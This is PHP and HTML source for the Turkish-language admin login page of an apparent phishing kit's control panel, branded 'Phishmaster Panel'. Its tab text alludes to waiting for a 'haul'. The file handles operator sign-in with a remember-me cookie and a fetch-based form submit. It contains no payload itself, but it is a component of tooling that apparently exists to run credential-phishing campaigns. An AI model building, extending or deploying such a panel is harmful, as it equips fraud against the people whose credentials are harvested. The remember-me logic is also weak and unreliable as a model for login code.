<?php include_once("../config.php"); include_once("./Data/Server/GrabIP.php"); include_once("./function/MainFunction.php");
  
  $QueryServer = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);

  if (isset($_SESSION['giris_yapildi'])) {
    header('Location: main');
    exit;
  }

  if (isset($_COOKIE['beni_hatirla']) && !empty($_COOKIE['beni_hatirla'])) {
    $stmt = $pdo->prepare('SELECT * FROM admin WHERE beni_hatirla = ?');
    $stmt->execute([ $_COOKIE['beni_hatirla'] ]);
    $account = $stmt->fetch(PDO::FETCH_ASSOC);
    if ($account) {
      session_regenerate_id();
      $_SESSION['giris_yapildi'] = TRUE;
      $_SESSION['kullanici'] = $account['kullanici_adi'];
      $_SESSION['id'] = $account['id'];
      $date = date('d.m.Y\TH:i:s');
      $stmt = $pdo->prepare('UPDATE admin SET son_gorulme = ? WHERE ip = ?');
      $stmt->execute([ $date, $ip ]);
      header('Location: main');
      exit;
    }
  }
?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Phishmaster</title>
    <meta name="description" content="Phishmaster Panel">
    <meta name="author" content="Phishmaster">
    <meta name="robots" content="noindex, nofollow">
    <meta property="og:title" content="Phishmaster Panel">
    <meta property="og:site_name" content="Developed Phishmaster">
    <meta property="og:description" content="Phishmaster Panel">
    <meta property="og:type" content="website">
    <meta property="og:url" content="">
    <meta property="og:image" content="">
    <link rel="shortcut icon" href="assets/media/favicons/favicon.png">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/media/favicons/favicon-192x192.png">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/media/favicons/apple-touch-icon-180x180.png">
    <link rel="stylesheet" id="css-main" href="assets/css/oneui.min.css">
  </head>
  <body>
    <div id="page-container">
      <main id="main-container">
        <div class="hero-static d-flex align-items-center">
          <div class="w-100">
            <div class="bg-body-extra-light">
              <div class="content content-full">
                <div class="row g-0 justify-content-center">
                  <div class="col-md-8 col-lg-6 col-xl-4 py-4 px-4 px-lg-5">
                    <div class="text-center">
                      <p class="mb-2">
                        <img src="assets/media/favicons/favicon.png" alt="Phishmaster">
                      </p>
                      <h1 class="h4 mb-1">
                        Phishmaster
                      </h1>
                      <p class="fw-medium text-muted mb-3">
                        Daha iyisini yapana kadar en iyisi 😜
                      </p>
                    </div>
                    <form class="giris-yap-dogrulama" action="./function/LoginFunction.php" method="POST">
                      <div class="py-3">
                        <div class="mb-4">
                          <input type="text" class="form-control form-control-lg form-control-alt" id="usernameS" name="usernameS" placeholder="Kullanıcı Adı">
                        </div>
                        <div class="mb-4">
                          <input type="password" class="form-control form-control-lg form-control-alt" id="passwordS" name="passwordS" placeholder="Şifre">
                        </div>
                        <div class="mb-4">
                          <div class="d-md-flex align-items-md-center justify-content-md-between">
                            <div class="form-check">
                              <input class="form-check-input" type="checkbox" id="beni_hatirla" name="beni_hatirla">
                              <label class="form-check-label" for="beni_hatirla">Beni Hatırla</label>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="row justify-content-center">
                        <div class="col-lg-6 col-xxl-5">
                          <button type="submit" class="btn w-100 btn-alt-primary" id="giris_btn">
                            <i class="fa fa-fw fa-sign-in-alt me-1 opacity-50"></i> Giriş Yap
                          </button>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
            <div class="fs-sm text-center text-muted py-3">
              <strong>Phishmaster</strong> © <span data-toggle="year-copy" class="js-year-copy-enabled">2023 v2.0</span>
            </div>
          </div>
        </div>
      </main>
    </div>
    <script type="text/javascript">
      let loginForm = document.querySelector(".content form");
      loginForm.onsubmit = event => {
		  document.getElementById('giris_btn').disabled = true
        event.preventDefault();
        fetch(loginForm.action, { method: 'POST', body: new FormData(loginForm) }).then(response => response.text()).then(result => {
			
          if (result.toLowerCase().includes("başarılı")) {
			  
            One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Hoşgeldiniz! 3 saniye içerisinde aktarılıyorsunuz.'});
            setInterval(function() {
              window.location.href = "main";
            }, 3000);
          } else {
			  document.getElementById('giris_btn').disabled = false
            One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: result});
          }
        });
      };

      var title = document.title;
      var alttitle = "Vurgun için bekleniyorsun ;)";
      window.onblur = function () { 
        document.title = alttitle;
      };
      window.onfocus = function () { 
        document.title = title;
      };
    </script>
    <script src="assets/js/oneui.app.min.js"></script>
    <script src="assets/js/lib/jquery.min.js"></script>
    <script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
    <script src="assets/js/pages/giris-yap.min.js"></script>
    <script src="assets/js/plugins/bootstrap-notify/bootstrap-notify.min.js"></script>
    <script>One.helpersOnLoad(['jq-notify']);</script>
  </body>
</html>